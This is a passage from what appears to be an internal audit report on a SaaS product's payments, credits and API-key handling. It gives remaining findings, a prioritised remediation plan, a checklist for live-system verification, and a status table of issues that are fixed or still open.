- Superuser checks are inconsistently normalized — `netlify-functions/admin-get-users.js:151` and `netlify-functions/delete-users.js:70` compare raw `user.email` against the raw env list, while the newer admin functions lowercase both. A mixed-case env value breaks half the admin panel.
- `delete-users` performs hard deletes with no audit-log entry and doesn't touch `api_keys`.
- Function logs print customer emails, user IDs and API-key prefixes at info level on every request.
- `track-event` stores raw IP addresses indefinitely with no retention policy (GDPR-relevant given EU customers).
- `MONTHLY_CREDITS_MAP` (`frontend-next/src/app/api/webhooks/polar/route.ts:43`) is keyed only `tier1/2/3` — fine today because `resolvePolarPlanId` normalizes to tiers, but it silently returns `undefined` (→ full annual lump sum granted, drip disabled) if anyone ever makes it return `lite/standard/pro`.
- Credit amounts are duplicated across `CREDITS_MAP`, `MONTHLY_CREDITS_MAP`, `SUBSCRIPTION_PLAN_CREDITS`, `PLAN_CREDIT_LIMITS`, and the `subscription_plans` table — five sources of truth that already disagree on the packs.

---

## 6. Suggested order of work

1. **Today:** C1 (key exfiltration), C3 (open email trigger), H6 (verify Polar product names — silent total-loss risk).
2. **This week:** C2 + H7 (credit packs — currently selling something that doesn't work), H1/H5 (bind payments to `user_id`, add idempotency), H3 (annual cancellation).
3. **Next:** H2 (revoked/refund handlers), H4 (revenue double-count), M1, M2.
4. **Then:** M6 — consolidate the schema into a replayable migration chain before touching anything else structurally.

---

## 7. Verification checklist (needs live systems, not verifiable from the repo)

- [ ] Polar dashboard: exact product names for both credit packs, and whether each product has `metadata.plan_id` / `metadata.type` set (H6).
- [ ] Supabase: does a `subscription_plans` row with id `credit_pack` exist? Does the `payments.plan_id` FK still exist? (H7)
- [ ] Supabase: is `payments.payment_id` unique? (H5)
- [ ] Supabase: current `cron.job` list — are `renew-free-credits` and `renew-paid-credits` both scheduled and succeeding? (C2, H2)
- [ ] Supabase: any `profiles` rows with `subscription_status` in (`cancelled`,`expired`) still on a paid `subscription_plan`? (H2)
- [ ] Netlify: is `UPSTASH_REDIS_REST_URL` set in production? (determines whether M1 is live)
- [ ] `payments` table: count of rows per subscription renewal — confirms H4 double-count in real data.

## 8. Tracking

| ID | Severity | Title | Status |
|---|---|---|---|
| C1 | Critical | `/connect` leaks API key to arbitrary `callback_url` / `postMessage("*")` | **Fixed 2026-08-05** |
| C2 | Critical | Credit packs unusable, then wiped by free renewal | **Fixed 2026-08-05** |
| C3 | Critical | `/track-event` unauthenticated, drives outbound lifecycle email | **Fixed locally 2026-08-05; not deployed** |
| R1 | High | `signup_created` silently dropped for email-confirmation signups | **Fixed locally 2026-08-05; not deployed** |
| R2 | Low | Legacy marketing events can no longer trigger lifecycle email | **Expected transition documented 2026-08-05** |
| R3 | Low | Recipient gate does not check `email_confirmed_at` | **Fixed locally 2026-08-05; not deployed** |
| S1 | Low | Cross-device `/connect` confirmation can miss `signup_created` when local storage is absent | **Fixed locally 2026-08-05; not deployed** |
| H1 | High | Payments bound to customers by email string only | Open |
| H2 | High | No `subscription.revoked` / refund handling | Open |
| H3 | High | Annual cancellation destroys pre-paid credits | Open |
| H4 | High | Subscription revenue double-counted in `payments` | Open |
| H5 | High | No webhook idempotency for one-time orders | **Fixed 2026-08-05** (via C2) |
| H6 | High | `"pro"` substring collision misclassifies packs as subscriptions | Open |
| H7 | High | `credit_pack` plan_id has no `subscription_plans` row (FK failure) | **Fixed 2026-08-05** (via O2) |
| M1 | Medium | Admin rate limits ignored when Upstash is enabled | Open |
| M2 | Medium | Rollover credits accumulate but can never be spent | Open |
| M3 | Medium | AI generation billed before credit deduction | Open |
| M4 | Medium | IP-only rate limiting, no per-key quota | Open |
| M5 | Medium | Weak fallback API-key generation; keys stored plaintext | Open |
| M6 | Medium | Migration chain not bootstrappable / not replayable | Open |
| M7 | Medium | Shadowed `userId` in `get-usage.js` | Open |
| M8 | Medium | Legacy PayPal-era tables, functions and routes | Open |
| N1 | Medium | No fallback when `window.opener` is severed (test Google OAuth path) | **Fixed 2026-08-05** |
| N2 | Low-Med | Dropped `postMessage` on origin mismatch reported as success | **Fixed 2026-08-05** |
| N3 | High | Ack requirement breaks all installed plugin versions ≤1.7.10 | **Fixed 2026-08-05** |
| N4 | Low | 10s ack timeout too tight for slow WordPress hosts | **Fixed 2026-08-05** |
| N5 | Low | Legacy path claims "WordPress confirmed the key was saved" | **Fixed 2026-08-05** |
| O1 | High | Credit-pack migration must be applied BEFORE the site deploy | **Fixed 2026-08-05** |
| O2 | Medium | Pack backfill blind to purchases H7 stopped from being recorded | **Fixed 2026-08-05** |
| O3 | Low | Pack backfill not re-runnable (missing `on conflict do nothing`) | **Fixed 2026-08-05** |
| O4 | Low | Backfill hardcodes 100/250; may mis-restore older pack sizes | **Fixed 2026-08-05** |
| O5 | Low | Purchased packs display as "promotional credits" | **Fixed 2026-08-05** |
| P1 | High | Webhook retries duplicate `payments` rows (no unique constraint) | **Fixed 2026-08-05** |
| P2 | Medium | Payment-record failure blocks credit fulfillment | **Fixed 2026-08-05** |
| P3 | Medium | Pack backfill UPDATE now touches every profile | **Fixed 2026-08-05** |
| P4 | Low | Discounted purchases mis-sized by amount-based backfill | **Fixed 2026-08-05** |
| P5 | Low | No non-negative CHECK on `purchased_credits_remaining`; drain order | **Fixed 2026-08-05** |
| Q1 | Medium | Payments dedup hard-deletes financial rows with no archive | **Fixed 2026-08-05** |
| Q2 | Low | Marketing-events unique index lets C3 suppress purchase events | **Fixed 2026-08-05** |
| T1 | Low | Concurrent `signup_created` posts can double-count before insert | **Fixed locally 2026-08-05; migration/app not deployed** |
| T2 | Low | Historical Google-OAuth gaps and legacy-row rejection affect early funnel comparisons | **Expected transition documented 2026-08-05** |
| U1 | Low | Signup unique-index creation could abort after a post-preflight duplicate | **Fixed locally 2026-08-05; migration not applied** |
